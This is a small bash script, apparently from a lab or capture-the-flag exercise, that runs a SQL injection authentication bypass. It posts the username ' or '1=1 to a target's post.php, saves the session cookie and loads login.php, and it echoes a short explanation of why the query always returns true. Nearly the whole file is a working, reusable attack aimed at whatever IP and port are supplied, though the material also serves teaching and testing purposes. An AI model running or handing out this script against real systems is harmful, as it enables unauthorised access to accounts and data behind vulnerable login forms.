#!/bin/bash
IP="$1";
PORT="$2";

curl -c cookies.txt --data "username=%27%20or%20%271%3D1&password=asdf&form=login&submit=Login" "$IP:$PORT/post.php";
curl -b cookies.txt "$IP:$PORT/login.php";

echo "=================================="
echo "SQL injection done";
echo "Username used: ' or '1=1"
echo "It worked because the username passed in cuts off the SQL query so it looks like: SELECT * FROM table WHERE username='' or '1=1' ... and always returns true";
echo "==================================";
